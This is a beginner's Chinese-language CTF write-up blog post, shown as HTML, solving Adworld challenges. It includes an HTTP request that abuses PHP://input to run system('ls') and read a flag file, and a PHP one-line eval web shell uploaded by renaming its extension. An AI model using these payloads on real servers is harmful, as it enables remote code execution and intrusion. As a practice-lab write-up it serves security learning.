@@ -1,0 +1,739 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    简单题writeup | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="来几个writeup这里将长期更新我作为新手遇到的有趣的题目的个人做题想法与见解，不定期更新，写手水平较菜，有问题请提出哦。 一.攻防世界1.php2(web)首页我们可以看到： 	 Can you anthenticate to this website?  在这里我们首要想到尝试访问首页和一些关键目录及敏感文件 	 1234567891011&#x2F;index.phps &#x2F;login.phps &#x2F;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单题writeup">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/01/31/%E7%AE%80%E5%8D%95%E9%A2%98writeup/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="来几个writeup这里将长期更新我作为新手遇到的有趣的题目的个人做题想法与见解，不定期更新，写手水平较菜，有问题请提出哦。 一.攻防世界1.php2(web)首页我们可以看到： 	 Can you anthenticate to this website?  在这里我们首要想到尝试访问首页和一些关键目录及敏感文件 	 1234567891011&#x2F;index.phps &#x2F;login.phps &#x2F;a">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-01-31T10:19:14.000Z">
+<meta property="article:modified_time" content="2026-02-05T13:10:58.460Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="buuctf">
+<meta property="article:tag" content="攻防世界">
+<meta property="article:tag" content="新手题目">
+<meta name="twitter:card" content="summary">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+                  <source media="(max-width: 479px)" srcset="/images/banner-600w.avif">
+                  <source media="(max-width: 479px)" srcset="/images/banner-600w.webp">
+                  <source media="(max-width: 799px)" srcset="/images/banner-800w.avif">
+                  <source media="(max-width: 799px)" srcset="/images/banner-800w.webp">
+                  <source media="(min-width: 800px)" srcset="/images/banner.avif">
+                  <source media="(min-width: 800px)" srcset="/images/banner.webp">
+            <img  fetchpriority="high" src="/images/banner.webp" alt="简单题writeup">
+        </picture>
+          <img alt="简单题writeup" style="visibility: hidden;">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">简单题writeup</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A5%E5%87%A0%E4%B8%AAwriteup"><span class="toc-number">1.</span> <span class="toc-text">来几个writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">1.1.</span> <span class="toc-text">一.攻防世界</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php2-web"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.php2(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CatCatCat-misc"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.CatCatCat(misc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ics-06-web"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.ics-06(web)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-view-source"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.view_source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Web-php-include-web"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.Web_php_include(web)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup01"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">writeup01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup02"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">writeup02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup03"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">writeup03</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-upload1-web"><span class="toc-number">1.1.6.</span> <span class="toc-text">5.upload1(web)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-buuctf"><span class="toc-number">1.2.</span> <span class="toc-text">二.buuctf</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">19</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-简单题writeup" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-01-31T10:19:14.000Z" itemprop="datePublished">2026-01-31</time>
+    <time style="display: none;" id="post-update-time">2026-02-05</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="来几个writeup"><a href="#来几个writeup" class="headerlink" title="来几个writeup"></a>来几个writeup</h1><p>这里将长期更新我作为新手遇到的有趣的题目的个人做题想法与见解，不定期更新，写手水平较菜，有问题请提出哦。</p>
+<h2 id="一-攻防世界"><a href="#一-攻防世界" class="headerlink" title="一.攻防世界"></a>一.攻防世界</h2><h3 id="1-php2-web"><a href="#1-php2-web" class="headerlink" title="1.php2(web)"></a>1.php2(web)</h3><p>首页我们可以看到： 	</p>
+<p>Can you anthenticate to this website? </p>
+<p>在这里我们首要想到尝试访问首页和一些关键目录及敏感文件 	</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/index.phps </span><br><span class="line">/login.phps </span><br><span class="line">/admin.phps </span><br><span class="line">/config.phps </span><br><span class="line">/flag.phps </span><br><span class="line">/backup.phps </span><br><span class="line">/index.php.bak </span><br><span class="line">/login.php.bak </span><br><span class="line">/index.php~ </span><br><span class="line">/.index.php.swp </span><br><span class="line">#带s和不带s的都尝试一下</span><br></pre></td></tr></table></figure>
+
+<p>(当然也可以使用御剑或deresearch直接扫描)</p>
+<p>尝试过后，我们得到&#x2F;index.phps 存在源码泄露如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&quot;admin&quot;===$_GET[id]) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;admin&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由此我们可以知道可以尝试修改URL，加上身份标识，且进行urlencode编码(因为源码urldecode会自动解码)；</p>
+<p>不妨试试直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.35:63879/index.php?id=admin</span><br></pre></td></tr></table></figure>
+
+<p>发现返回：not allowed!</p>
+<p>说明我们的猜想是对的，那么进行urlencode再加入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.35:63879/index.php?id=%61%64%6d%69%6e</span><br></pre></td></tr></table></figure>
+
+<p>发现仍然返回：not allowed!</p>
+<p>为什么呢？因为浏览器会自动对URL进行一次urldecode，在转入的一瞬间浏览器重新解码为admin</p>
+<p>因此我们只要对其进行二次编码即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.35:63879/index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</span><br></pre></td></tr></table></figure>
+
+<p>最终得到flag：</p>
+<p>cyberpeace{c5df0b4661f5fe3d57b964a152b41b7a}</p>
+<h3 id="2-CatCatCat-misc"><a href="#2-CatCatCat-misc" class="headerlink" title="2.CatCatCat(misc)"></a>2.CatCatCat(misc)</h3><p>首先先说明一点，本题要用到kali Linux shell的基础操作<del>(本人也不清楚有没有其他更好的方法)</del></p>
+<p>我们看到该题提供了一张jpg图片和一串文本，先看看图片：</p>
+<p>我们按惯例先把图片放进010看看它的十六进制文本，文件头和尾均没有发现什么可疑点，因此我们考虑直接用最原始的方法暴力扫描图片的信息，这时候就要用到kali shell了。</p>
+<p>(二编：对不起啊010大人，我错怪你了，010直接检索flag字符串可以直接得到密码QAQ)</p>
+<p>这里我提一嘴，kali虚拟机初始账号密码默认为kali，但在部分场景可能存在权限不足的问题，所以我们可以为root设立初始密码，方便以后的使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
+
+
+
+<p>回到正题，我们将猫猫.jpg复制到kali桌面上，然后cd到桌面，用strings命令查看图片所含有的所有隐藏字符，其中有一段尤为明显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwordis..catflag..</span><br></pre></td></tr></table></figure>
+
+<p>可能是暗示我们某个密码是catflag？</p>
+<p>然后我们看向文本，文本标题为“我养了一只叫兔子的91岁的猫猫”，出于敏锐，我们可以猜测可能与Rabbit加密有关，我们网上找一个rabbit加解密网站，发现解密需要密钥，可能就是刚刚在图片扫描得来的：catflag？</p>
+<p>试着解密得到：一段大概长这样的：（较长只截取一小段）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[BBo!9/DC&gt;ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]D)=9W/HqUYt3P_o%&quot;3P_oj&quot;3P_o6cTf=[jBo!9/DC&gt;ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow&quot;3P_ow&quot;3P_o6cTf=[BBo!9/DC&gt;ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)QI8y|u5.cL]D)=9W/HqUYtA</span><br></pre></td></tr></table></figure>
+
+<p>再根据文本名的91<del>（不是暗广）</del>，我们猜测为base91编码，丢进去解密得到大概长这样：（一小段）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat.</span><br><span class="line">cat. cat! cat? cat! cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat.</span><br><span class="line">cat. cat. cat. cat. cat. cat. cat. cat. cat? cat. cat? cat! cat. cat? cat.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>与题目的猫相同，这里我们就可以确定方向应该是正确的了，根据特征判断为Ook语言，解密得到flag：</p>
+<p>CATCTF{Th1s_V3ry_cute_catcat!!!}</p>
+<p>(kali shell我爱你ლ(′◉❥◉｀ლ))</p>
+<h3 id="3-ics-06-web"><a href="#3-ics-06-web" class="headerlink" title="3.ics-06(web)"></a>3.ics-06(web)</h3><p>这题其实没什么难度，主要是我第一次使用burpsuite的intruder模块爆破，感觉挺好玩的()</p>
+<p>个人做题时手动试了一下修改URL后面的数字无效后去搜索了一下如何快速尝试然后发现bp可以做到()</p>
+<p>这里就简单提一嘴做法，先用bp抓包发送到intruder模块，然后设置id&#x3D;$$  的payload，选择numbers进行爆破,很快我们就能发现id&#x3D;2333时响应长度与众不同，回浏览器试了一下便能得到flag。</p>
+<p>另外，weak_auth这题做法类似，不展开说明。</p>
+<h3 id="4-view-source"><a href="#4-view-source" class="headerlink" title="4.view_source"></a>4.view_source</h3><p>这题我们打开后发现右键被禁用无法查看页面源代码，结合题目我们可以尝试在URL前加入view_source：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://61.147.171.105:61223/</span><br></pre></td></tr></table></figure>
+
+<p>这样可以强制查看页面源代码得到flag。</p>
+<p>ps：如果不知道这种做法也可以直接打开burpsuite查看HTML记录。</p>
+<h3 id="5-Web-php-include-web"><a href="#5-Web-php-include-web" class="headerlink" title="5.Web_php_include(web)"></a>5.Web_php_include(web)</h3><p>这题真的十分震惊小灯我()，一打开来就是PHP代码审计，粗略地看一眼感觉像是PHP伪协议，由于本人学习浅薄，百般尝试无果后去寻找大佬们帮助，发现这题的做法非常多且自由()。。。而且涉及到的知识点较为广，包含但不限于SQL,php伪协议等。值得深入探究，故做此题解QAQ。</p>
+<p>首先题目给了一个这样的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">echo $_GET[&#x27;hello&#x27;];</span><br><span class="line">$page=$_GET[&#x27;page&#x27;];</span><br><span class="line">while (strstr($page, &quot;php://&quot;)) &#123;</span><br><span class="line">  $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);</span><br><span class="line">&#125;</span><br><span class="line">include($page);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们很清楚地可以看到代码对于php：&#x2F;&#x2F;做出了过滤，但显然过滤并不严格，我们可以用最简单的大小写绕过PHP:&#x2F;&#x2F;来完成绕过。</p>
+<h4 id="writeup01"><a href="#writeup01" class="headerlink" title="writeup01"></a>writeup01</h4><p>这是我能想到最简单的做法了()</p>
+<p>题目很清楚地明示我们这题与php伪协议有关，我们就要考虑相关知识，我们知道php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
+<p>因此我们打开burpsuite抓包，将得到的包改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /?page=PHP://input HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:51940</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 40</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;ls&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以得到响应如下：</p>
+<p>fl4gisisish3r3.php<br>index.php<br>phpinfo.php</p>
+<p>对此我们再进行改包得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /?page=PHP://input HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:51940</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 40</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;cat fl4gisisish3r3.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接得到flag：ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p>
+<p>从这样看这道题还是蛮简单的(),但是我在网上查了一下，看到了好多震撼小灯的解法emmmmmm，这里也一个个去尝试了一下，在这里分享一下：</p>
+<h4 id="writeup02"><a href="#writeup02" class="headerlink" title="writeup02"></a>writeup02</h4><p>先鸽着，会补的！！！</p>
+<h4 id="writeup03"><a href="#writeup03" class="headerlink" title="writeup03"></a>writeup03</h4><h3 id="5-upload1-web"><a href="#5-upload1-web" class="headerlink" title="5.upload1(web)"></a>5.upload1(web)</h3><p>本题开头让你上传文件，根据经验应该是一句话木马，在尝试后发现只能上传jpg，png文件，于是在本地新建文本文档，然后写一句话木马如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@eval($_POST[&#x27;123&#x27;]);</span><br><span class="line">echo(&#x27;123&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里以上述代码为例，稍微讲一下一句话木马的基本原理：</p>
+<p>1.php代码的内容部分要包裹在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>里，才能被服务器所解析；</p>
+<p>2.@在代码中的作用是令服务器不报错，即使错误也不报错，减少服务器报错而泄露密码（也就是代码中的“123”）；</p>
+<p>3.eval()函数的作用:</p>
+<p>eval(“echo ‘123’”);的作用是echo ‘123’,句子连起来就变为用post方法接收变量123，也就是执行123.</p>
+<p><strong>注意</strong>(骗你的其实不重要)</p>
+<p>一句话木马写完记得点保存(我才不会说我因为没保存导致没有echoQAQ)</p>
+<p>然后把后缀改为jpg直接上传，用burpsuite抓包后改后缀为php后放行，若上传文件后缀名为php说明成功。</p>
+<p>再进入文件路径，若页面有123便是成功。</p>
+<p>然后用蚁剑连接，密码就是自己设置的123；(注意URL要文件详细路径才能连接成功)</p>
+<p>然后找到flag。</p>
+<h2 id="二-buuctf"><a href="#二-buuctf" class="headerlink" title="二.buuctf"></a>二.buuctf</h2><p>此处还在施(tou)工(lan)</p>
+
+    </div>
+    <footer class="article-footer">
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/buuctf/" rel="tag" title="buuctf">buuctf</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag" title="攻防世界">攻防世界</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%96%B0%E6%89%8B%E9%A2%98%E7%9B%AE/" rel="tag" title="新手题目">新手题目</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/39e140edac9ea960ff5b1c27f5316a89.jpg" data-sizes="auto" alt="PHP反序列化漏洞" class="lazyload">
+        <a href="/2026/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" aria-label="Prev: PHP反序列化漏洞" title="Prev: PHP反序列化漏洞"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            PHP反序列化漏洞
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/castorice-honkai-3840x2160-22114.jpg" data-sizes="auto" alt="流量分析" class="lazyload">
+      <a href="/2025/12/30/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" aria-label="Next: 流量分析"  title="Next: 流量分析"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          流量分析
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        14.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:10
+      </div>
+      <div>
+        <span class="icon-eye"></span>
